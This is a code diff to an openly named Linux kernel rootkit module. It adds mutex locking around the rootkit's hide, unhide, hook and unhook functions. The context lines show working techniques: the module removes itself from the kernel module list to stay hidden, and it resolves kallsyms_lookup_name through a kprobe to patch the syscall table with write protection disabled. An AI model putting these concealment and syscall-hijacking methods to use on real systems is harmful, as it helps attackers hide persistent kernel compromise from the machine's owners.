@@ -15,9 +15,11 @@ struct cdev *kernel_cdev;
 /****** hide unhide ******/
 static bool hidden;
 static struct list_head *prev_module;
+struct mutex hide_mutex;
 
 /****** hook ******/
 static bool hooked;
+struct mutex hook_mutex;
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name",
 };
@@ -62,22 +64,30 @@ const struct file_operations fops = {
 };
 
 static void hide_rootkit(void)
-{
+{	
+	mutex_lock(&hide_mutex);
+
     	pr_info("rootkit: hiding rootkit!\n");
     	if (THIS_MODULE->list.prev != NULL){
         	prev_module = THIS_MODULE->list.prev;
         	list_del(&THIS_MODULE->list);
     	}
     	hidden = true;
+
+	mutex_unlock(&hide_mutex);
 }
 
 static void unhide_rootkit(void)
 {
+	mutex_lock(&hide_mutex);
+
 	pr_info("rootkit: revealing rootkit!\n");
     	if (prev_module != NULL) {
         	list_add(&THIS_MODULE->list, prev_module);
     	}
     	hidden = false;
+
+	mutex_unlock(&hide_mutex);
 }
 
 /**
@@ -163,7 +173,9 @@ static void write_protection_enable()
  * ref: https://blog.csdn.net/weixin_42915431/article/details/115289115
 */
 static int rootkit_hook(void)
-{
+{	
+	mutex_lock(&hook_mutex);
+
 	if(!hooked) {
 		pr_info("rootkit: Start hooking syscalls.\n");
 		sys_call_table_ = 
@@ -184,11 +196,15 @@ static int rootkit_hook(void)
 	} else {
 		pr_info("rootkit: Already hooked syscalls.\n");
 	}
+
+	mutex_unlock(&hook_mutex);
 	return 0;
 }
 
 static int rootkit_unhook(void)
 {
+	mutex_lock(&hook_mutex);
+
 	if(hooked) {
 		preempt_disable();
 		write_protection_disable();
@@ -202,6 +218,8 @@ static int rootkit_unhook(void)
 	} else {
 		pr_info("rootkit: Not hooked syscalls yet.\n");
 	}
+
+	mutex_unlock(&hook_mutex);
 	return 0;
 }
 
@@ -271,6 +289,9 @@ static int __init rootkit_init(void)
 		pr_info("rootkit: unable to allocate cdev");
 		return ret;
 	}
+
+	mutex_init(&hide_mutex);
+	mutex_init(&hook_mutex);
 
 	return 0;
 }
